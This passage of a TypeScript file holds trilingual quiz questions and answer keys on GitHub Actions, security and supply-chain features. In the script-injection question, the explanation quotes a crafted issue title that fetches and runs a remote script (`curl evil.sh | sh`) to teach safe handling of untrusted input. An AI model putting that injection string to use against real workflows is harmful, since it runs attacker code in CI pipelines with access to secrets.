      "Cada omisión es una excepción a las garantías del ruleset. Mantén la lista corta, prefiere apps a personas y elige la omisión solo para pull requests cuando sea posible, para que incluso una omisión deje un registro revisado. Las omisiones aparecen en los rule insights y en el registro de auditoría.",
    ],
  },
];

const actionsAdvanced: GithubQuestion[] = [
  {
    id: "gh-actions-21",
    q: ["What is the difference between a reusable workflow and a composite action?", "Quelle est la différence entre un workflow réutilisable et une action composite ?", "¿Qué diferencia hay entre un workflow reutilizable y una acción compuesta?"],
    a: ["A reusable workflow (`workflow_call`) is called as a whole job or jobs; a composite action bundles steps used inside a job", "Un workflow réutilisable (`workflow_call`) est appelé comme un ou plusieurs jobs entiers ; une action composite regroupe des étapes utilisées dans un job", "Un workflow reutilizable (`workflow_call`) se llama como uno o varios jobs completos; una acción compuesta agrupa pasos usados dentro de un job"],
    w: [["They are two names for the same feature", "Ce sont deux noms pour la même fonction", "Son dos nombres para la misma función"], ["Composite actions can define jobs, reusable workflows cannot", "Les actions composites peuvent définir des jobs, pas les workflows réutilisables", "Las acciones compuestas pueden definir jobs y los workflows reutilizables no"], ["Reusable workflows only work inside one repository", "Les workflows réutilisables ne marchent que dans un seul dépôt", "Los workflows reutilizables solo funcionan dentro de un repositorio"]],
    e: [
      "A reusable workflow has `on: workflow_call` with inputs and secrets, and a caller job writes `uses: org/repo/.github/workflows/deploy.yml@v1`; it can hold several jobs, environments and runners. A composite action (`runs: using: composite`) is a step-level building block. Both can be shared across repositories.",
      "Un workflow réutilisable a `on: workflow_call` avec des entrées et des secrets, et un job appelant écrit `uses: org/repo/.github/workflows/deploy.yml@v1` ; il peut contenir plusieurs jobs, environnements et runners. Une action composite (`runs: using: composite`) est une brique au niveau des étapes. Les deux se partagent entre dépôts.",
      "Un workflow reutilizable tiene `on: workflow_call` con entradas y secretos, y un job que lo llama escribe `uses: org/repo/.github/workflows/deploy.yml@v1`; puede contener varios jobs, entornos y runners. Una acción compuesta (`runs: using: composite`) es una pieza a nivel de pasos. Ambos se comparten entre repositorios.",
    ],
  },
  {
    id: "gh-actions-22",
    q: ["A deploy workflow must never run twice at once, and a newer run should replace a waiting one. What do you set?", "Un workflow de déploiement ne doit jamais tourner deux fois en même temps, et une exécution plus récente doit remplacer une en attente. Que règles-tu ?", "Un workflow de despliegue nunca debe ejecutarse dos veces a la vez, y una ejecución más nueva debe sustituir a una en espera. ¿Qué configuras?"],
    a: ["`concurrency` with a group such as `deploy-production`", "`concurrency` avec un groupe comme `deploy-production`", "`concurrency` con un grupo como `deploy-production`"],
    w: [["`max-parallel: 1` in the matrix", "`max-parallel: 1` dans la matrice", "`max-parallel: 1` en la matriz"], ["`timeout-minutes: 1`", "`timeout-minutes: 1`", "`timeout-minutes: 1`"], ["`needs:` on itself", "`needs:` sur lui-même", "`needs:` sobre sí mismo"]],
    e: [
      "Runs and jobs in the same concurrency group run one at a time: one running, at most one pending, and a newer pending run replaces the older pending one. `cancel-in-progress: true` also cancels the running one, good for pull request checks, risky for deployments.",
      "Les exécutions et jobs d'un même groupe de concurrence tournent un à la fois : un en cours, au plus un en attente, et une exécution en attente plus récente remplace la plus ancienne. `cancel-in-progress: true` annule aussi celle en cours, bien pour les vérifications de pull request, risqué pour les déploiements.",
      "Las ejecuciones y jobs de un mismo grupo de concurrencia corren de uno en uno: uno en marcha, como mucho uno pendiente, y una ejecución pendiente más nueva sustituye a la más antigua. `cancel-in-progress: true` cancela también la que está en marcha, bueno para las comprobaciones de pull requests, arriesgado para despliegues.",
    ],
  },
  {
    id: "gh-actions-23",
    q: ["How does a step pass a value to later steps and to the job's outputs?", "Comment une étape passe-t-elle une valeur aux étapes suivantes et aux sorties du job ?", "¿Cómo pasa un paso un valor a los pasos siguientes y a las salidas del job?"],
    a: ["It appends `name=value` to the file `$GITHUB_OUTPUT`, read as `steps.<id>.outputs.name`", "Elle ajoute `name=value` au fichier `$GITHUB_OUTPUT`, lu comme `steps.<id>.outputs.name`", "Añade `name=value` al archivo `$GITHUB_OUTPUT`, que se lee como `steps.<id>.outputs.name`"],
    w: [["It exports an environment variable, which every later job sees", "Elle exporte une variable d'environnement, que chaque job suivant voit", "Exporta una variable de entorno, que ven todos los jobs siguientes"], ["It writes the value to the log, which GitHub parses", "Elle écrit la valeur dans le journal, que GitHub analyse", "Escribe el valor en el registro, que GitHub analiza"], ["It commits the value to the repository", "Elle committe la valeur dans le dépôt", "Confirma el valor en el repositorio"]],
    e: [
      "`echo \"version=1.4.0\" >> \"$GITHUB_OUTPUT\"` in a step with `id: meta` exposes `steps.meta.outputs.version`; the job maps it under `outputs:` so other jobs read `needs.<job>.outputs.version`. The old `::set-output` command was deprecated. `$GITHUB_ENV` sets variables for later steps of the same job.",
      "`echo \"version=1.4.0\" >> \"$GITHUB_OUTPUT\"` dans une étape avec `id: meta` expose `steps.meta.outputs.version` ; le job la reprend sous `outputs:` pour que d'autres jobs lisent `needs.<job>.outputs.version`. L'ancienne commande `::set-output` est dépréciée. `$GITHUB_ENV` règle des variables pour les étapes suivantes du même job.",
      "`echo \"version=1.4.0\" >> \"$GITHUB_OUTPUT\"` en un paso con `id: meta` expone `steps.meta.outputs.version`; el job la recoge en `outputs:` para que otros jobs lean `needs.<job>.outputs.version`. La antigua orden `::set-output` está obsoleta. `$GITHUB_ENV` fija variables para los pasos siguientes del mismo job.",
    ],
  },
  {
    id: "gh-actions-24",
    q: ["When is a self-hosted runner worth it?", "Quand un runner auto-hébergé vaut-il la peine ?", "¿Cuándo merece la pena un runner autoalojado?"],
    a: ["When jobs need special hardware, access to a private network, or run so much that your own machines cost less", "Quand les jobs ont besoin de matériel particulier, d'un accès à un réseau privé, ou tournent tant que tes propres machines coûtent moins", "Cuando los jobs necesitan hardware especial, acceso a una red privada, o corren tanto que tus propias máquinas salen más baratas"],
    w: [["Always, because it is more secure by default", "Toujours, parce que c'est plus sûr par défaut", "Siempre, porque es más seguro por defecto"], ["For public repositories accepting outside pull requests", "Pour les dépôts publics qui acceptent des pull requests extérieures", "Para repositorios públicos que aceptan pull requests externas"], ["Never: GitHub forbids it on organizations", "Jamais : GitHub l'interdit aux organisations", "Nunca: GitHub lo prohíbe en las organizaciones"]],
    e: [
      "Hosted runners are clean, maintained and isolated per job. Self-hosted runners are yours to patch, scale and clean, and a non-ephemeral one keeps state between jobs. On a public repository anyone's pull request could run code on your machine. Larger hosted runners cover many hardware needs.",
      "Les runners hébergés sont propres, entretenus et isolés par job. Les runners auto-hébergés sont à toi de les mettre à jour, dimensionner et nettoyer, et un runner non éphémère garde un état d'un job à l'autre. Sur un dépôt public, la pull request de n'importe qui pourrait exécuter du code sur ta machine. Les runners hébergés plus grands couvrent beaucoup de besoins matériels.",
      "Los runners alojados están limpios, mantenidos y aislados por job. Los autoalojados te toca a ti parchearlos, escalarlos y limpiarlos, y uno no efímero guarda estado entre jobs. En un repositorio público, la pull request de cualquiera podría ejecutar código en tu máquina. Los runners alojados más grandes cubren muchas necesidades de hardware.",
    ],
  },
];

const securityAdvanced: GithubQuestion[] = [
  {
    id: "gh-security-21",
    q: ["How can a workflow deploy to Google Cloud without storing a service account key?", "Comment un workflow peut-il déployer sur Google Cloud sans stocker de clé de compte de service ?", "¿Cómo puede un workflow desplegar en Google Cloud sin guardar una clave de cuenta de servicio?"],
    a: ["With OIDC: the job gets a signed GitHub token (`id-token: write`) that Workload Identity Federation exchanges for short-lived credentials", "Avec OIDC : le job reçoit un jeton GitHub signé (`id-token: write`) que la Workload Identity Federation échange contre des identifiants de courte durée", "Con OIDC: el job recibe un token de GitHub firmado (`id-token: write`) que Workload Identity Federation cambia por credenciales de corta duración"],
    w: [["By putting the key in a repository variable instead of a secret", "En mettant la clé dans une variable du dépôt au lieu d'un secret", "Poniendo la clave en una variable del repositorio en vez de en un secreto"], ["By giving Google Cloud the `GITHUB_TOKEN`", "En donnant le `GITHUB_TOKEN` à Google Cloud", "Dando a Google Cloud el `GITHUB_TOKEN`"], ["It cannot: a key is always needed", "Ce n'est pas possible : il faut toujours une clé", "No puede: siempre hace falta una clave"]],
    e: [
      "GitHub's OIDC provider signs a token describing the run (repository, branch, environment, workflow). The cloud trusts that issuer and maps claims to a service account, issuing credentials valid for about an hour. No long-lived secret exists to leak; AWS and Azure work the same way.",
      "Le fournisseur OIDC de GitHub signe un jeton décrivant l'exécution (dépôt, branche, environnement, workflow). Le cloud fait confiance à cet émetteur et associe les claims à un compte de service, en délivrant des identifiants valables environ une heure. Aucun secret durable n'existe qui pourrait fuir ; AWS et Azure fonctionnent de la même façon.",
      "El proveedor OIDC de GitHub firma un token que describe la ejecución (repositorio, rama, entorno, workflow). La nube confía en ese emisor y asocia los claims a una cuenta de servicio, emitiendo credenciales válidas una hora más o menos. No existe ningún secreto duradero que filtrar; AWS y Azure funcionan igual.",
    ],
  },
  {
    id: "gh-security-22",
    q: ["Why pin third-party actions to a full commit SHA rather than a tag such as `@v4`?", "Pourquoi épingler les actions tierces par SHA de commit complet plutôt que par un tag comme `@v4` ?", "¿Por qué fijar las acciones de terceros por SHA de commit completo en vez de por un tag como `@v4`?"],
    a: ["A tag can be moved to malicious code; a SHA always means the same code", "Un tag peut être déplacé vers du code malveillant ; un SHA désigne toujours le même code", "Un tag se puede mover a código malicioso; un SHA siempre designa el mismo código"],
    w: [["SHAs download faster", "Les SHA se téléchargent plus vite", "Los SHA se descargan más rápido"], ["Tags stop working after a year", "Les tags cessent de fonctionner après un an", "Los tags dejan de funcionar al cabo de un año"], ["GitHub refuses tags in `uses:`", "GitHub refuse les tags dans `uses:`", "GitHub rechaza los tags en `uses:`"]],
    e: [
      "In March 2025 attackers moved the tags of the popular `tj-actions/changed-files` action to a commit that dumped secrets into logs; workflows pinned to SHAs were unaffected. Pin with a comment such as `# v4.2.1` and let Dependabot update the SHA. Organizations can enforce SHA pinning in their Actions policy.",
      "En mars 2025, des attaquants ont déplacé les tags de l'action populaire `tj-actions/changed-files` vers un commit qui vidait les secrets dans les journaux ; les workflows épinglés par SHA n'ont pas été touchés. Épingle avec un commentaire comme `# v4.2.1` et laisse Dependabot mettre le SHA à jour. Les organisations peuvent imposer l'épinglage par SHA dans leur politique Actions.",
      "En marzo de 2025, unos atacantes movieron los tags de la popular acción `tj-actions/changed-files` a un commit que volcaba los secretos en los registros; los workflows fijados por SHA no se vieron afectados. Fija con un comentario como `# v4.2.1` y deja que Dependabot actualice el SHA. Las organizaciones pueden imponer la fijación por SHA en su política de Actions.",
    ],
  },
  {
    id: "gh-security-23",
    q: ["A step runs `echo \"${{ github.event.issue.title }}\"`. What is the risk?", "Une étape lance `echo \"${{ github.event.issue.title }}\"`. Quel est le risque ?", "Un paso ejecuta `echo \"${{ github.event.issue.title }}\"`. ¿Cuál es el riesgo?"],
    a: ["Script injection: the title is pasted into the script before it runs, so a crafted title runs commands", "L'injection de script : le titre est collé dans le script avant son exécution, donc un titre forgé exécute des commandes", "Inyección de script: el título se pega en el script antes de ejecutarlo, así que un título preparado ejecuta órdenes"],
    w: [["None: quotes protect the value", "Aucun : les guillemets protègent la valeur", "Ninguno: las comillas protegen el valor"], ["The title may be too long for the log", "Le titre peut être trop long pour le journal", "El título puede ser demasiado largo para el registro"], ["Issue titles are secrets and get masked", "Les titres d'issue sont des secrets et sont masqués", "Los títulos de issue son secretos y se enmascaran"]],
    e: [
      "`${{ }}` is expanded into the script text before the shell runs, so a title like `a\"; curl evil.sh | sh; \"` breaks out of the quotes. Pass untrusted values through an environment variable (`env: TITLE: ${{ github.event.issue.title }}`) and use `\"$TITLE\"` in the script.",
      "`${{ }}` est développé dans le texte du script avant que le shell tourne, donc un titre comme `a\"; curl evil.sh | sh; \"` sort des guillemets. Passe les valeurs non fiables par une variable d'environnement (`env: TITLE: ${{ github.event.issue.title }}`) et utilise `\"$TITLE\"` dans le script.",
      "`${{ }}` se expande en el texto del script antes de que corra el shell, así que un título como `a\"; curl evil.sh | sh; \"` escapa de las comillas. Pasa los valores no fiables por una variable de entorno (`env: TITLE: ${{ github.event.issue.title }}`) y usa `\"$TITLE\"` en el script.",
    ],
  },
  {
    id: "gh-security-24",
    q: ["What does an artifact attestation prove?", "Que prouve une attestation d'artefact ?", "¿Qué prueba una atestación de artefacto?"],
    a: ["Which repository, workflow and commit built a given file, signed so that consumers can verify it", "Quel dépôt, quel workflow et quel commit ont construit un fichier donné, avec une signature que les utilisateurs peuvent vérifier", "Qué repositorio, workflow y commit construyeron un archivo dado, firmado para que los usuarios puedan verificarlo"],
    w: [["That the file has no vulnerabilities", "Que le fichier n'a pas de vulnérabilités", "Que el archivo no tiene vulnerabilidades"], ["That a human reviewed the file", "Qu'un humain a relu le fichier", "Que una persona revisó el archivo"], ["That the file was downloaded from GitHub", "Que le fichier a été téléchargé depuis GitHub", "Que el archivo se descargó de GitHub"]],
    e: [
      "`actions/attest-build-provenance` creates SLSA build provenance for a binary or container image, signed with Sigstore using the run's OIDC identity. `gh attestation verify` checks it before use. It proves origin, not quality: a compromised workflow still produces honest-looking provenance of its own output.",
      "`actions/attest-build-provenance` crée une provenance de build SLSA pour un binaire ou une image de conteneur, signée avec Sigstore grâce à l'identité OIDC de l'exécution. `gh attestation verify` la vérifie avant usage. Elle prouve l'origine, pas la qualité : un workflow compromis produit quand même une provenance d'apparence honnête de ce qu'il fabrique.",
      "`actions/attest-build-provenance` crea una procedencia de build SLSA para un binario o una imagen de contenedor, firmada con Sigstore gracias a la identidad OIDC de la ejecución. `gh attestation verify` la comprueba antes de usarla. Prueba el origen, no la calidad: un workflow comprometido produce igualmente una procedencia de aspecto honrado de lo que fabrica.",
    ],
  },
];

const supplyAdvanced: GithubQuestion[] = [
  {
    id: "gh-supply-21",
    q: ["What is the difference between CodeQL's default setup and advanced setup?", "Quelle est la différence entre la configuration par défaut et la configuration avancée de CodeQL ?", "¿Qué diferencia hay entre la configuración por defecto y la avanzada de CodeQL?"],
    a: ["Default setup is turned on in the settings with no file; advanced setup is a workflow you control, for custom builds, queries or schedules", "La configuration par défaut s'active dans les réglages, sans fichier ; l'avancée est un workflow que tu maîtrises, pour des builds, requêtes ou calendriers personnalisés", "La configuración por defecto se activa en los ajustes, sin archivo; la avanzada es un workflow que controlas, para builds, consultas o calendarios propios"],
    w: [["Default setup scans dependencies, advanced setup scans code", "La configuration par défaut analyse les dépendances, l'avancée le code", "La por defecto analiza dependencias y la avanzada el código"], ["Advanced setup is only for public repositories", "La configuration avancée n'est que pour les dépôts publics", "La avanzada es solo para repositorios públicos"], ["Default setup finds secrets, advanced setup finds bugs", "La configuration par défaut trouve les secrets, l'avancée les bugs", "La por defecto encuentra secretos y la avanzada errores"]],
    e: [
      "CodeQL builds a database of the code and runs queries for vulnerability patterns such as injection or path traversal. Default setup picks languages and runs on pushes, pull requests and weekly. Advanced setup writes `.github/workflows/codeql.yml` for compiled languages needing a custom build, extra query packs or monorepo layouts. Results appear as code scanning alerts.",
      "CodeQL construit une base de données du code et lance des requêtes cherchant des motifs de vulnérabilité comme l'injection ou la traversée de chemin. La configuration par défaut choisit les langages et tourne aux push, aux pull requests et chaque semaine. L'avancée écrit `.github/workflows/codeql.yml` pour les langages compilés qui demandent un build particulier, des paquets de requêtes en plus ou des monorepos. Les résultats deviennent des alertes de code scanning.",
      "CodeQL construye una base de datos del código y lanza consultas que buscan patrones de vulnerabilidad como inyección o recorrido de rutas. La configuración por defecto elige los lenguajes y corre en los push, en las pull requests y cada semana. La avanzada escribe `.github/workflows/codeql.yml` para lenguajes compilados que requieren un build propio, paquetes de consultas adicionales o monorepos. Los resultados aparecen como alertas de code scanning.",
    ],
  },
  {
    id: "gh-supply-22",
    q: ["What does push protection add to secret scanning?", "Qu'ajoute la push protection au secret scanning ?", "¿Qué añade la push protection al secret scanning?"],
    a: ["It blocks a push containing a recognized secret before it reaches the repository, unless the pusher bypasses with a reason", "Elle bloque un push contenant un secret reconnu avant qu'il atteigne le dépôt, sauf si l'auteur la contourne avec une raison", "Bloquea un push que contiene un secreto reconocido antes de que llegue al repositorio, salvo que quien sube la omita indicando un motivo"],
    w: [["It deletes secrets from old commits", "Elle supprime les secrets des anciens commits", "Borra los secretos de los commits antiguos"], ["It rotates the leaked credentials automatically", "Elle change automatiquement les identifiants divulgués", "Cambia automáticamente las credenciales filtradas"], ["It encrypts files that contain secrets", "Elle chiffre les fichiers qui contiennent des secrets", "Cifra los archivos que contienen secretos"]],
    e: [
      "Scanning after the fact finds secrets already exposed; push protection stops them at `git push` (and in the web editor and API). A bypass records a reason (false positive, used in tests, fix later) and can be made to require approval. It is on by default for public repositories' users.",
      "L'analyse après coup trouve des secrets déjà exposés ; la push protection les arrête au `git push` (et dans l'éditeur web et l'API). Un contournement enregistre une raison (faux positif, utilisé dans les tests, corriger plus tard) et peut être soumis à approbation. Elle est active par défaut pour les utilisateurs des dépôts publics.",
      "El análisis a posteriori encuentra secretos ya expuestos; la push protection los detiene en el `git push` (y en el editor web y la API). Una omisión registra un motivo (falso positivo, usado en pruebas, arreglar más tarde) y puede requerir aprobación. Está activada por defecto para los usuarios de repositorios públicos.",
    ],
  },
  {
    id: "gh-supply-23",
    q: ["What does the dependency review action do in a pull request?", "Que fait l'action dependency review dans une pull request ?", "¿Qué hace la acción dependency review en una pull request?"],
    a: ["It shows the dependencies the pull request adds or changes and can fail the check on known vulnerabilities or disallowed licences", "Elle montre les dépendances ajoutées ou modifiées par la pull request et peut faire échouer la vérification sur des vulnérabilités connues ou des licences interdites", "Muestra las dependencias que la pull request añade o cambia y puede hacer fallar la comprobación por vulnerabilidades conocidas o licencias prohibidas"],
    w: [["It updates every dependency to its latest version", "Elle met chaque dépendance à sa dernière version", "Actualiza cada dependencia a su última versión"], ["It reviews the code of each dependency line by line", "Elle relit le code de chaque dépendance ligne par ligne", "Revisa el código de cada dependencia línea a línea"], ["It removes unused dependencies", "Elle supprime les dépendances inutilisées", "Quita las dependencias no usadas"]],
    e: [
      "Dependabot alerts react after a vulnerable package is on the default branch; dependency review stops it at the door. `actions/dependency-review-action` compares manifests between base and head, with options such as `fail-on-severity: high` and `deny-licenses`. Made a required check, it blocks the merge.",
      "Les alertes Dependabot réagissent une fois le paquet vulnérable sur la branche par défaut ; la dependency review l'arrête à la porte. `actions/dependency-review-action` compare les manifestes entre base et head, avec des options comme `fail-on-severity: high` et `deny-licenses`. Rendue obligatoire, elle bloque la fusion.",
      "Las alertas de Dependabot reaccionan cuando el paquete vulnerable ya está en la rama por defecto; la dependency review lo para en la puerta. `actions/dependency-review-action` compara los manifiestos entre base y head, con opciones como `fail-on-severity: high` y `deny-licenses`. Convertida en obligatoria, bloquea la fusión.",
    ],
  },
  {
    id: "gh-supply-24",
    q: ["A workflow auto-merges Dependabot pull requests. Which ones are reasonable to auto-merge?", "Un workflow fusionne automatiquement les pull requests Dependabot. Lesquelles est-il raisonnable de fusionner ainsi ?", "Un workflow fusiona automáticamente las pull requests de Dependabot. ¿Cuáles es razonable fusionar así?"],
    a: ["Patch and perhaps minor updates, read with `dependabot/fetch-metadata`, and only once the required tests pass", "Les mises à jour correctives et peut-être mineures, lues avec `dependabot/fetch-metadata`, et seulement une fois les tests exigés passés", "Las actualizaciones de parche y quizá menores, leídas con `dependabot/fetch-metadata`, y solo cuando pasan las pruebas exigidas"],
    w: [["All of them, majors included, to stay current", "Toutes, majeures comprises, pour rester à jour", "Todas, mayores incluidas, para estar al día"], ["Only those that change the lockfile", "Seulement celles qui modifient le lockfile", "Solo las que cambian el lockfile"], ["None: GitHub forbids merging Dependabot pull requests by workflow", "Aucune : GitHub interdit de fusionner les pull requests Dependabot par workflow", "Ninguna: GitHub prohíbe fusionar por workflow las pull requests de Dependabot"]],
    e: [
      "`dependabot/fetch-metadata` exposes `update-type` (`version-update:semver-patch`…); the workflow then runs `gh pr merge --auto --squash` for the safe kinds. Auto-merge waits for the required checks, so test coverage is what makes it safe. Major versions break APIs and deserve a human.",
      "`dependabot/fetch-metadata` expose `update-type` (`version-update:semver-patch`…) ; le workflow lance alors `gh pr merge --auto --squash` pour les sortes sûres. L'auto-merge attend les vérifications exigées, donc c'est la couverture de tests qui le rend sûr. Les versions majeures cassent des API et méritent un humain.",
      "`dependabot/fetch-metadata` expone `update-type` (`version-update:semver-patch`…); el workflow ejecuta entonces `gh pr merge --auto --squash` para los tipos seguros. El auto-merge espera a las comprobaciones exigidas, así que lo que lo hace seguro es la cobertura de pruebas. Las versiones mayores rompen API y merecen a una persona.",
    ],
  },
];

export const repos = { reposAdvanced };
export const issues = { issuesAdvanced };
export const pulls = { pullsAdvanced };
export const teams = { teamsAdvanced };
export const protection = { protectionAdvanced };
export const actions = { actionsAdvanced };
export const security = { securityAdvanced };
export const supply = { supplyAdvanced };
